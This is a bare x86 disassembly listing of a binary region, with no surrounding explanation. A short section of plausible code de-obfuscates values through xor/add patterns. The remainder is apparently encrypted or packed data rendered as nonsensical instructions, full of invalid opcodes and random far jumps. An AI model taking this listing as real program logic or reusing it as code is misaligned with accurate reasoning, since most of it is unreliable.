  408189:	mov    ?,WORD PTR [esi-0x10]
  40818c:	in     eax,dx
  40818d:	aaa    
  40818e:	or     DWORD PTR ds:0xf72eb4e6,esi
  408194:	iret   
  408195:	mov    esi,0xbbb1f64b
  40819a:	ds ret 
  40819c:	not    DWORD PTR [ecx+eax*4]
  40819f:	icebp  
  4081a0:	push   eax
  4081a1:	sbb    eax,DWORD PTR [ecx-0x4e]
  4081a4:	mov    cl,0xec
  4081a6:	fwait
  4081a7:	sahf   
  4081a8:	adc    DWORD PTR [ebx],edx
  4081aa:	sar    DWORD PTR [edx-0x29],cl
  4081ad:	mov    DWORD PTR [edx+ebx*4+0x3a],esi
  4081b1:	push   ss
  4081b2:	fstp   QWORD PTR ss:[edx]
  4081b5:	jmp    0xdc8e:0x7696f55c
  4081bc:	or     DWORD PTR [edi],ecx
  4081be:	test   al,0xb
  4081c0:	and    al,0x6e
  4081c2:	shl    ebp,cl
  4081c4:	imul   eax,DWORD PTR [ebp-0x61],0x8c5c6c82
  4081cb:	adc    ebp,DWORD PTR [edx]
  4081cd:	cdq    
  4081ce:	cmp    al,0x3f
  4081d0:	adc    ecx,DWORD PTR [ecx+0x458dc92b]
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	rol    BYTE PTR [edi+0x2],1
  40826b:	jmp    0x70b154a7
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408298
  408275:	leave  
  408276:	out    dx,eax
  408277:	repz sbb al,BYTE PTR [edx+0x3f]
  40827b:	shl    DWORD PTR [edx-0x64c8a4f6],1
  408281:	lods   eax,DWORD PTR ds:[esi]
  408282:	int3   
  408283:	push   edx
  408284:	sub    al,0xe0
  408286:	(bad)  
  408287:	imul   eax,DWORD PTR [ebx+ebp*2],0xfffffffa
  40828b:	sbb    esp,DWORD PTR [ebx]
  40828d:	mov    BYTE PTR [ebx-0xb72b91d],dl
  408293:	test   al,0x8b
  408295:	out    0xa,al
  408297:	sub    BYTE PTR [esp+ebx*2-0x7ccb50cb],cl
  40829e:	aaa    
  40829f:	in     eax,0x94
  4082a1:	mov    dl,0x5a
  4082a3:	fiadd  WORD PTR ds:0x68e7cb3d
  4082a9:	mov    ds:0x1862d004,eax
  4082ae:	mov    dl,0x33
  4082b0:	mov    al,0x85
  4082b2:	xor    eax,0x622faf27
  4082b7:	xchg   edx,eax
  4082b8:	push   ecx
  4082b9:	rol    BYTE PTR [eax],0xeb
  4082bc:	add    cl,BYTE PTR ds:0xce9b73e4
  4082c2:	pushf  
  4082c3:	mov    ebx,0x719472ad
  4082c8:	dec    ebp
  4082c9:	xchg   ebp,eax
  4082ca:	cmp    bh,BYTE PTR [ecx+eax*8]
  4082cd:	xchg   edx,eax
  4082ce:	arpl   WORD PTR [edx+ebx*1+0x1152d450],cx
  4082d5:	test   al,0x68
  4082d7:	add    al,0xcf
  4082d9:	pop    esi
  4082da:	push   ebx
  4082db:	mov    ebx,?
  4082dd:	clc    
  4082de:	push   esp
  4082df:	dec    ebx
  4082e0:	xor    eax,ecx
  4082e2:	icebp  
  4082e3:	pop    eax
  4082e4:	inc    edx
  4082e5:	div    esi
  4082e7:	retf   0xc318
  4082ea:	mov    ds:0xa3c5de86,al
  4082ef:	pop    esi
  4082f0:	xor    al,0x7
  4082f2:	or     al,0xbf
  4082f4:	dec    esp
  4082f5:	cld    
  4082f6:	add    edx,0x36
  4082f9:	popa   
  4082fa:	push   0xc9f23a2d
  4082ff:	pushf  
  408300:	sbb    eax,0xbca6af5
  408305:	xlat   BYTE PTR ds:[ebx]
  408306:	ss (bad) 
  408308:	jbe    0x408292
  40830a:	mov    ds:0xb74ea276,al
  40830f:	idiv   DWORD PTR [ebx+0x7e]
  408312:	cmc    
  408313:	xor    BYTE PTR [ebx],0xf1
  408316:	dec    edi
  408317:	and    DWORD PTR cs:[edx-0x6c],esi
  40831b:	mov    BYTE PTR [esp+edx*1-0x46],bh
  40831f:	mov    ah,al
  408321:	pop    esp
  408323:	pop    ebp
  408324:	lea    ebx,[esp+edi*1]
  408327:	jmp    0x4bedba50
  40832c:	je     0x40835b
  40832e:	outs   dx,DWORD PTR ds:[esi]
  40832f:	add    ebp,0x3250760
  408335:	add    al,0x28
  408337:	ds pop ds
  408339:	call   0x4e1e1135
  40833e:	out    0x49,eax
  408340:	pop    esp
  408341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408342:	(bad)  
  408343:	scas   eax,DWORD PTR es:[edi]
  408344:	int    0xb2
  408346:	xchg   ebx,eax
  408347:	sub    edi,esi
  408349:	ja     0x4083a1
  40834b:	out    dx,al
  40834c:	inc    eax
  40834d:	cld    
  40834e:	in     eax,0xc3
  408350:	push   ebp
  408351:	in     eax,dx
  408352:	in     eax,dx
  408353:	into   
  408354:	pop    eax
  408355:	xor    al,0xbe
  408357:	icebp  
  408358:	mov    eax,ds:0x1d4193f
  40835d:	pop    ds
  40835e:	(bad)  [edx+ecx*1-0x441e578f]
  408365:	inc    edi
  408366:	push   esi
  408367:	mov    ecx,0x502ef714
  40836c:	or     DWORD PTR [edi-0x590e7a7f],edx
  408372:	clc    
  408373:	fst    st(3)
  408375:	test   BYTE PTR [ebp-0x15],cl
  408378:	sbb    esp,edx
  40837a:	jnp    0x408326
  40837c:	or     esi,DWORD PTR [ecx-0x21]
  40837f:	mov    al,ds:0xc5f06090
  408384:	mov    ah,0xef
  408386:	adc    bl,cl
  408388:	out    dx,al
  408389:	pop    eax
  40838a:	mov    al,ds:0x9db05110
  40838f:	sub    BYTE PTR [esi+0xa],bl
  408392:	cwde   
  408393:	fstp   QWORD PTR [eax+0x4c09b8f5]
  408399:	mov    dl,0x0
  40839b:	scas   al,BYTE PTR es:[edi]
  40839c:	dec    edx
  40839d:	xchg   esi,eax
  40839e:	pop    ebx
  40839f:	outs   dx,DWORD PTR ds:[esi]
  4083a0:	fadd   DWORD PTR [edx+0x5af0fbb7]
  4083a6:	xchg   ecx,eax
  4083a7:	push   edi
  4083a8:	sbb    al,BYTE PTR [ebx+ecx*4]
  4083ab:	cwde   
  4083ac:	ret    
  4083ad:	scas   al,BYTE PTR es:[edi]
  4083ae:	push   ds
  4083af:	adc    DWORD PTR [ebx],ebp
  4083b1:	scas   al,BYTE PTR es:[edi]
  4083b2:	lods   eax,DWORD PTR ds:[esi]
  4083b3:	icebp  
  4083b4:	and    dl,BYTE PTR [eax]
  4083b6:	pop    es
  4083b7:	(bad)  
  4083b8:	push   edi
  4083b9:	cwde   
  4083ba:	pop    esp
  4083bb:	xchg   ecx,eax
  4083bc:	sbb    DWORD PTR [edx-0x5d2d48de],edi
  4083c2:	cmc    
  4083c3:	sub    eax,0xe47a6a8e
  4083c8:	jnp    0x408363
  4083ca:	mov    cl,0x45
  4083cc:	mov    dl,0x61
  4083ce:	fsub   QWORD PTR [esi+0x17]
  4083d1:	mov    al,0x8
  4083d3:	xor    BYTE PTR ds:0xb9050395,dl
  4083d9:	add    al,0x35
  4083db:	cmp    eax,0xeb8186dd
  4083e0:	jo     0x408425
  4083e2:	out    dx,eax
  4083e3:	mov    al,ds:0x27db8726
  4083e8:	lahf   
  4083e9:	xor    al,cl
  4083eb:	xor    DWORD PTR [ecx-0x1e8c0af5],esp
  4083f1:	sub    ch,BYTE PTR [esi-0xd272a6c]
  4083f7:	add    BYTE PTR ds:0xd1f812d2,ch
  4083fd:	push   ecx
  4083fe:	push   ds
  4083ff:	in     al,0x30
  408401:	and    al,0x2d
  408403:	dec    edx
  408404:	and    eax,0xd7b292b2
  408409:	sbb    al,0x77
  40840b:	inc    edi
  40840c:	loope  0x4083c6
  40840e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40840f:	enter  0x9a1b,0x9a
  408413:	adc    al,0xce
  408415:	or     eax,0xa895466f
  40841a:	sti    
  40841b:	mov    dl,0x78
  40841d:	outs   dx,BYTE PTR ds:[esi]
  40841e:	xchg   BYTE PTR [ebp-0x6a00844],cl
  408424:	aad    0x18
  408426:	pushf  
  408427:	sbb    ch,0xcb
  40842a:	or     esi,edx
  40842c:	add    DWORD PTR [edx-0x2d941d76],0xffffffed
  408433:	mov    eax,ds:0x4bac409e
  408438:	ror    BYTE PTR [eax+ebx*4+0x2b],1
  40843c:	fsubr  QWORD PTR [esi]
  40843e:	and    DWORD PTR ds:0xdf8b8ed2,0xffffffdc
  408445:	adc    BYTE PTR [edx-0x1a],bl
  408448:	jnp    0x4083f9
  40844a:	or     al,0xbe
  40844c:	cmp    eax,0x9cbe4e35
  408451:	daa    
  408452:	out    dx,al
  408453:	call   0x4c63:0xc21151a8
  40845a:	mov    ?,esi
  40845c:	ins    BYTE PTR es:[edi],dx
  40845d:	aas    
  40845e:	jmp    0x361b:0x7626e05b
  408465:	mov    edi,0x3e952ae0
  40846a:	gs test eax,0xa03b9e63
  408470:	jno    0x408415
  408472:	and    edi,esi
  408474:	(bad)  
  408475:	pop    esi
  408476:	sbb    dh,BYTE PTR [esi+ebp*4-0x16615220]
  40847d:	add    dl,BYTE PTR [ebp-0x10be2beb]
  408483:	mov    bh,0xc5
  408485:	data16 (bad) 
  408487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408488:	dec    ecx
  408489:	mov    ecx,0xe0c38f83
  40848e:	ds pop edx
  408490:	cmp    BYTE PTR [eax-0x7b],dl
  408493:	sbb    DWORD PTR [eax-0x1a92dff2],ecx
  408499:	mov    edi,0x312c4ee1
  40849e:	add    DWORD PTR ds:0x581c1c08,esp
  4084a4:	cmp    eax,0x3161384e
  4084aa:	repnz pop ebx
  4084ac:	inc    edi
  4084ad:	enter  0x3e92,0x35
  4084b1:	sub    eax,0x7f6ef22f
  4084b6:	sub    BYTE PTR [edi-0x13],0xdf
  4084ba:	mov    dh,0x1a
  4084bc:	stos   DWORD PTR es:[edi],eax
  4084bd:	xchg   esp,eax
  4084be:	das    
  4084bf:	loope  0x408474
  4084c1:	scas   al,BYTE PTR es:[edi]
  4084c2:	jno    0x4084a2
  4084c4:	enter  0xa6ee,0xce
  4084c8:	jnp    0x40850e
  4084ca:	pushf  
  4084cb:	adc    al,0x2d
  4084cd:	cli    
  4084ce:	mov    ebp,0xd01174f2
  4084d3:	outs   dx,DWORD PTR ds:[esi]
  4084d4:	lea    ebp,[ebp+0x1c]
  4084d7:	jp     0x40850f
  4084d9:	xor    DWORD PTR [ebx+esi*4-0x23069948],0x12
  4084e1:	mov    eax,0x2828e490
  4084e6:	hlt    
  4084e7:	outs   dx,DWORD PTR ds:[esi]
  4084e8:	and    eax,0x7a939000
  4084ed:	pusha  
  4084ee:	mov    DWORD PTR [ecx+0x6981d5bd],esp
  4084f4:	xlat   BYTE PTR ds:[ebx]
  4084f5:	int    0x21
  4084f7:	mov    al,ds:0x5327a516
  4084fc:	fcmove st,st(2)
  4084fe:	push   0xffffffdf
  408500:	adc    DWORD PTR [edi+edi*4],esp
  408503:	cld    
  408504:	outs   dx,DWORD PTR ds:[esi]
  408505:	clc    
  408506:	jo     0x408498
  408508:	aad    0x38
  40850a:	shl    dh,cl
  40850c:	popa   
  40850d:	out    0x2c,eax
  40850f:	and    BYTE PTR [edx],ch
  408511:	cmp    dh,BYTE PTR [ebx-0x11d31842]
  408517:	jne    0x4084e5
  408519:	and    eax,0x527cdbca
  40851e:	or     DWORD PTR [ebx+0x25],ebp
  408521:	and    al,0x3
  408523:	xchg   esp,eax
  408524:	and    DWORD PTR [edx-0x5319de9e],edi
  40852a:	scas   al,BYTE PTR es:[edi]
  40852b:	mov    gs,WORD PTR [esi-0x45]
  40852e:	leave  
  40852f:	shl    DWORD PTR [eax-0x6aef5837],0x28
  408536:	in     eax,0xa5
  408538:	imul   edi,DWORD PTR es:[ecx+eax*1],0x22
  40853d:	icebp  
  40853e:	call   0xa6a0:0xc383325a
  408545:	push   ss
  408546:	sbb    al,0x16
  408548:	lahf   
  408549:	xor    eax,0x187f0cc0
  40854e:	add    eax,0x443cd4e2
  408553:	fs xor al,0x4f
  408556:	cli    
  408557:	outs   dx,BYTE PTR ds:[esi]
  408558:	retf   0x8130
  40855b:	(bad)  
  40855d:	sub    al,0x50
  40855f:	sbb    BYTE PTR [edx+esi*8+0x1c],al
  408563:	xchg   DWORD PTR [edi],esi
  408565:	cmp    al,0xa
  408567:	push   edi
  408568:	sbb    esp,DWORD PTR [ebx+edi*8+0x5c]
  40856c:	mov    ch,0x48
  40856e:	mov    ah,0xfa
  408570:	adc    DWORD PTR [eax-0x35],0xfffffff2
  408574:	or     ebp,DWORD PTR [ecx+0x7770fb27]
  40857a:	mov    DWORD PTR [ebp+esi*4-0xe48891b],ebx
  408581:	adc    ch,BYTE PTR [eax]
  408583:	(bad)  
  408584:	addr16 dec esp
  408586:	pcmpgtb mm5,QWORD PTR [ebp+0x6079fdc4]
  40858d:	icebp  
  40858e:	add    DWORD PTR [ebx-0x68a8915b],esp
  408594:	pop    edx
  408595:	mov    ch,0xba
  408597:	inc    eax
  408598:	fucomp st(2)
  40859a:	xor    dh,BYTE PTR ds:0x816448ce
  4085a0:	or     eax,0x880938fd
  4085a5:	add    ecx,ebp
  4085a7:	dec    eax
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xeb7a12cc
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408609
  4085c4:	pop    esi
  4085c5:	dec    ebx
  4085c6:	clc    
  4085c7:	add    al,0x19
  4085c9:	fwait
  4085ca:	inc    ebp
  4085cb:	xchg   BYTE PTR fs:[ecx+esi*4-0x53c8bc8c],ch
  4085d3:	mov    fs,ebx
  4085d5:	or     al,0xf0
  4085d7:	stc    
  4085d8:	push   ecx
  4085d9:	mov    WORD PTR [eax-0x148a8edc],?
  4085df:	test   DWORD PTR [ebx-0x57],ebp
  4085e2:	xor    al,0xfb
  4085e4:	mov    WORD PTR [edi+0x4e],ds
  4085e7:	jg     0x408662
  4085e9:	inc    esi
  4085ea:	push   eax
  4085eb:	sub    eax,0x12e03f7a
  4085f0:	pop    esi
  4085f1:	push   ecx
  4085f2:	out    0xbb,al
  4085f4:	pop    es
  4085f5:	lahf   
  4085f6:	add    dh,ch
  4085f8:	cmp    DWORD PTR [ebx],edi
  4085fa:	add    DWORD PTR [esi+eiz*2],edx
  4085fd:	push   ss
  4085fe:	inc    eax
  4085ff:	jne    0x408638
  408601:	fwait
  408602:	push   ebp
  408603:	and    BYTE PTR [ebp+0x56eb02b3],bh
  408609:	ja     0x40862a
  40860b:	push   edi
  40860c:	fstp   QWORD PTR [ebp+0x47a9c3ae]
  408612:	ficomp WORD PTR [esi+eax*1]
  408615:	inc    esi
  408616:	outs   dx,BYTE PTR ds:[esi]
  408617:	(bad)  
  408618:	clc    
  408619:	jo     0x408628
  40861b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861c:	lods   al,BYTE PTR ds:[esi]
  40861d:	(bad)  
  40861e:	xchg   edi,eax
  40861f:	fstp   DWORD PTR [esi]
  408621:	mov    ch,0x2d
  408623:	outs   dx,BYTE PTR ds:[esi]
  408624:	xchg   ecx,eax
  408625:	or     DWORD PTR [edi],ebx
  408627:	sub    al,0x3b
  408629:	je     0x40864c
  40862b:	push   ebp
  40862c:	in     al,0xad
  40862e:	outs   dx,BYTE PTR ds:[esi]
  40862f:	cmp    DWORD PTR [ebx-0x10],edx
  408632:	jo     0x40862c
  408634:	int3   
  408635:	das    
  408636:	aam    0xa4
  408638:	jb     0x4085fb
  40863a:	mov    esp,0x51d073f5
  40863f:	jle    0x408600
  408641:	pop    ecx
  408642:	cmp    al,0x67
  408644:	(bad)  
  408645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408646:	in     eax,dx
  408647:	and    al,0x9f
  408649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40864a:	sub    dl,BYTE PTR [edi-0x28]
  40864d:	push   edx
  40864e:	lods   eax,DWORD PTR ds:[esi]
  40864f:	iret   
  408650:	jo     0x40863c
  408652:	fs mov al,0xdc
  408655:	xor    bl,BYTE PTR [edx]
  408657:	aam    0xbe
  408659:	out    0xd0,eax
  40865b:	div    BYTE PTR [ebx+edx*1-0xef648ad]
  408662:	xor    esp,DWORD PTR [ebp-0x13979941]
  408668:	int    0xff
  40866a:	icebp  
  40866b:	dec    ebx
  40866c:	add    BYTE PTR [eax+0x3e],bh
  40866f:	adc    eax,0x14308b4e
  408674:	into   
  408675:	hlt    
  408676:	test   al,0xcd
  408678:	push   edi
  408679:	mov    edi,ebp
  40867b:	out    0xfd,al
  40867d:	adc    DWORD PTR [eax],eax
  40867f:	xor    eax,0xbfc8dc60
  408684:	cmp    eax,DWORD PTR [ebp+edx*1-0x4ae88f50]
  40868b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40868c:	push   ds
  40868d:	test   eax,0xd022522e
  408692:	loop   0x408639
  408694:	dec    esi
  408695:	fldcw  WORD PTR [eax-0x13dfe4f2]
  40869b:	xchg   edi,eax
  40869c:	mov    edx,0xab39c338
  4086a1:	inc    ebp
  4086a2:	iret   
  4086a3:	mov    ds:0x96244a73,al
  4086a8:	push   esi
  4086a9:	dec    eax
  4086aa:	stc    
  4086ab:	ins    DWORD PTR es:[edi],dx
  4086ac:	mov    esp,0x270a935
  4086b1:	loopne 0x4086c6
  4086b3:	stc    
  4086b4:	xchg   ebx,eax
  4086b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086b6:	sbb    al,BYTE PTR [eax+0x6]
  4086b9:	cmp    bh,BYTE PTR [ebp+0x6f]
  4086bc:	mov    eax,ds:0x28dfeac2
  4086c1:	and    eax,0x5908f82
  4086c6:	xor    DWORD PTR [esi+0x568848d4],ebp
  4086cc:	xchg   ebx,eax
  4086cd:	lods   eax,DWORD PTR ds:[esi]
  4086ce:	jno    0x4086a2
  4086d0:	or     al,0x8c
  4086d2:	aam    0xa4
  4086d4:	popa   
  4086d5:	xchg   edi,eax
  4086d6:	loope  0x40867d
  4086d8:	mov    ah,0xb3
  4086da:	add    eax,0x91930bdf
  4086df:	nop
  4086e0:	stos   DWORD PTR es:[edi],eax
  4086e1:	ins    BYTE PTR es:[edi],dx
  4086e2:	dec    ebp
  4086e3:	xlat   BYTE PTR cs:[ebx]
  4086e5:	mov    bl,0xa6
  4086e7:	test   ebx,edx
  4086e9:	push   ss
  4086ea:	call   0xf868:0x933fb6a0
  4086f1:	add    esp,DWORD PTR [ebx-0x5f4b170]
  4086f7:	int    0x42
  4086f9:	inc    ebx
  4086fa:	test   BYTE PTR [ebx-0xd55cd26],ah
  408700:	push   esp
  408701:	dec    ebx
  408702:	ffreep st(3)
  408704:	xchg   DWORD PTR [esi+0x6ef7c664],esi
  40870a:	mov    esi,0xeba96a4
  40870f:	xchg   DWORD PTR [ebx],esp
  408711:	call   0x5d20:0xfc377ec
  408718:	jno    0x408795
  40871a:	in     al,dx
  40871b:	xor    DWORD PTR [ebp+0x1b],esp
  40871e:	mov    dh,0x52
  408720:	cmp    BYTE PTR ds:0x4c9081b2,cl
  408726:	imul   ebx,DWORD PTR [eax-0x74ae57a4],0xe
  40872d:	sar    dl,0x28
  408730:	push   ebp
  408731:	rol    BYTE PTR [ecx],cl
  408733:	ret    
  408734:	lds    ebx,FWORD PTR [eax]
  408736:	or     bl,BYTE PTR [eax]
  408738:	fcomi  st,st(4)
  40873a:	lahf   
  40873b:	add    ch,ah
  40873d:	mov    cl,0x6c
  40873f:	dec    ebp
  408740:	retf   0x6927
  408743:	inc    edi
  408744:	or     edi,esp
  408746:	mov    ecx,0x3d53db0d
  40874b:	mov    al,ds:0x43a9fcaa
  408750:	push   0x21
  408752:	arpl   dx,bp
  408754:	and    ebx,DWORD PTR ds:0xc7dec6a8
  40875a:	(bad)
  40875e:	push   esi
  40875f:	loopne 0x408706
  408761:	shl    ch,0x61
  408764:	inc    ecx
  408765:	sahf   
  408766:	(bad)  
  408768:	fnclex 
  40876a:	jns    0x408788
  40876c:	leave  
  40876d:	jno    0x4087b8
  40876f:	ins    DWORD PTR es:[edi],dx
  408770:	pushf  
  408771:	in     eax,0x5d
  408773:	jnp    0x408772
  408775:	xchg   edi,eax
  408776:	lahf   
  408777:	push   edi
  408778:	icebp  
  408779:	or     cl,BYTE PTR [edx]
  40877b:	sbb    BYTE PTR ds:0x8e4a4cc,ch
  408781:	push   ecx
  408782:	repz or DWORD PTR [ecx],esp
  408785:	xchg   esi,eax
  408786:	aas    
  408787:	add    BYTE PTR [ecx],bl
  408789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878a:	ss sahf 
  40878c:	add    DWORD PTR [esi+0x1cbd03f6],eax
  408792:	js     0x4087b1
  408794:	dec    edx
  408795:	adc    bl,BYTE PTR [ecx+0x66]
  408798:	sti    
  408799:	inc    BYTE PTR [esi]
  40879b:	mov    ebp,0x360929da
  4087a0:	cmp    bh,cl
  4087a2:	inc    BYTE PTR [esi]
  4087a4:	adc    BYTE PTR [eax+0x25],ah
  4087a7:	retf   0x3850
  4087aa:	popa   
  4087ab:	xor    cl,dh
  4087ad:	dec    ebp
  4087ae:	inc    eax
  4087af:	xor    ch,BYTE PTR [ebx-0x29dffdad]
  4087b5:	add    DWORD PTR [edx+0x7522ef97],edi
  4087bb:	mov    eax,0x76534066
  4087c0:	jge    0x408759
  4087c2:	imul   eax
  4087c4:	xor    BYTE PTR [ecx+0x2fad9b27],ch
  4087ca:	test   al,0xcd
  4087cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087cd:	cdq    
  4087ce:	xor    bl,ah
  4087d0:	in     eax,dx
  4087d1:	and    al,0x6b
  4087d3:	lock dec eax
  4087d5:	mov    ds:0x5f0f371d,al
  4087da:	or     al,0xe1
  4087dd:	and    eax,0x51c9ed42
  4087e2:	ret    
  4087e3:	inc    edx
  4087e4:	xchg   esp,eax
  4087e5:	mov    dh,0x7a
  4087e7:	pop    ecx
  4087e8:	hlt    
  4087e9:	or     esp,ecx
  4087eb:	xchg   edx,eax
  4087ec:	ja     0x4087d4
  4087ee:	xor    DWORD PTR [eax-0x677ef94f],ecx
  4087f4:	adc    edi,esi
  4087f6:	fmul   st(3),st
  4087f8:	dec    edi
  4087f9:	mov    ds:0x7ec4f14b,al
  4087fe:	ins    BYTE PTR es:[edi],dx
  4087ff:	sti    
  408800:	(bad)  
  408801:	fldenv [eax-0x7452a622]
  408807:	cmp    dh,BYTE PTR [eax+0x7b]
  40880a:	ror    dh,1
  40880c:	and    BYTE PTR [edx],bl
  40880e:	mov    ds:0x4ef042c6,eax
  408813:	mov    dh,BYTE PTR [ebp+0x6538f030]
  408819:	ret    0xcb97
  40881c:	inc    eax
  40881d:	cld    
  40881e:	pop    ecx
  40881f:	sbb    ebp,DWORD PTR [esi-0x7b]
  408822:	ror    DWORD PTR [ebx+ebp*2+0x0],cl
  408826:	outs   dx,BYTE PTR ds:[esi]
  408827:	push   0xffffff8f
  408829:	pop    edi
  40882a:	inc    esp
  40882b:	push   ecx
  40882c:	loopne 0x40889f
  40882e:	mov    DWORD PTR [edx],ebp
  408830:	jl     0x4087be
  408832:	enter  0x4972,0xa5
  408836:	sub    bh,BYTE PTR [esi+0x5ebb3f09]
  40883c:	cs cs das 
  40883f:	sbb    ebx,DWORD PTR [ebx+eiz*4-0x10d039a7]
  408846:	pushf  
  408847:	inc    DWORD PTR ds:0x7de842c3
  40884d:	ret    
  40884e:	cdq    
  40884f:	les    eax,FWORD PTR [ebx]
  408851:	sub    dl,BYTE PTR [esi+edi*8+0x5403abd0]
  408858:	or     al,0x53
  40885a:	scas   al,BYTE PTR es:[edi]
  40885b:	fmul   QWORD PTR [ebx-0x22]
  40885e:	pushf  
  40885f:	mov    ds:0xec780534,al
  408864:	push   edx
  408865:	test   BYTE PTR [edx],ah
  408867:	stos   BYTE PTR es:[edi],al
  408868:	xchg   edi,eax
  408869:	adc    bl,ah
  40886b:	and    eax,0xb0659e0f
  408870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408871:	inc    eax
  408872:	mov    edx,0x4b6c7ee3
  408877:	add    eax,0x4f3fffa8
  40887c:	adc    eax,DWORD PTR [edi+eax*2-0x42d95486]
  408883:	repz add BYTE PTR [edx],0x6e
  408887:	xor    al,BYTE PTR [esi+0x2b51aa47]
  40888d:	std    
  40888e:	or     BYTE PTR [ebx-0x53],bh
  408891:	ret    
  408892:	pop    esi
  408893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408894:	mov    al,0x2
  408896:	push   ecx
  408897:	fwait
  408898:	ror    DWORD PTR [esp+ebx*2],cl
  40889b:	mov    ds:0x5507a5a9,al
  4088a0:	mov    bh,0x4e
  4088a2:	mov    edx,0x21df8f6
  4088a7:	lds    esi,FWORD PTR [ebx-0x52]
  4088aa:	mov    esp,0x6d52a258
  4088af:	int    0xd0
  4088b1:	jnp    0x4088f3
  4088b3:	lods   al,BYTE PTR ds:[esi]
  4088b4:	pushf  
  4088b5:	lock popf 
  4088b7:	jecxz  0x4088e3
  4088b9:	fld    QWORD PTR [edi-0x70]
  4088bc:	mov    ebp,DWORD PTR [ebx+0x22]
  4088bf:	push   ebx
  4088c0:	add    esp,edx
  4088c2:	mov    edx,0x1fb67283
  4088c7:	sbb    eax,0x821177bf
  4088cc:	dec    edi
  4088cd:	lods   al,BYTE PTR ds:[esi]
  4088ce:	pop    ds
  4088cf:	popa   
  4088d0:	push   ecx
  4088d1:	inc    esi
  4088d2:	pop    edi
  4088d3:	push   edx
  4088d4:	pop    ss
  4088d5:	adc    al,0xea
  4088d7:	arpl   WORD PTR [ebx+0x4b13020e],ax
  4088dd:	lods   al,BYTE PTR ds:[esi]
  4088de:	cld    
  4088df:	pop    edi
  4088e0:	xchg   edx,eax
  4088e1:	lea    edi,[edi+0x35]
  4088e4:	jne    0x4088da
  4088e6:	pop    ebp
  4088e7:	sti    
  4088e8:	out    0x63,eax
  4088ea:	push   ebx
  4088eb:	test   BYTE PTR ds:0x3593607d,dl
  4088f1:	(bad)  
  4088f2:	or     DWORD PTR [ebp+0xfef845],0x40
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x77bca301],cl
  40890c:	rcl    edi,cl
  40890e:	pushf  
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x4088bc
  408918:	add    BYTE PTR [ebx+0x7e],bh
  40891b:	push   ecx
  40891c:	in     al,dx
  40891d:	sub    DWORD PTR [ebx-0x5e],edi
  408920:	retf   0x4be7
  408923:	sbb    BYTE PTR ds:[esi-0x6e],bl
  408927:	shl    BYTE PTR [ebp+0x77],0xe5
  40892b:	dec    ecx
  40892c:	inc    esp
  40892d:	addr16 and al,0x46
  408930:	add    al,0x89
  408932:	inc    esp
  408933:	test   al,0xd2
  408935:	lds    esp,FWORD PTR [ebp-0x4e130713]
  40893b:	sbb    DWORD PTR [ebp+edi*1+0x71b57c29],edi
  408942:	xchg   BYTE PTR [ebx-0x13],bh
  408945:	inc    eax
  408946:	pop    edx
  408947:	mov    ds:0xcf60f4c9,al
  40894c:	out    dx,eax
  40894d:	mov    edi,0xb1ad23dd
  408952:	push   ss
  408953:	pop    edi
  408954:	cmovno esp,DWORD PTR [esp+edx*4-0x23]
  408959:	mov    edi,0x43ab9a6a
  40895e:	arpl   sp,bp
  408960:	xchg   ecx,eax
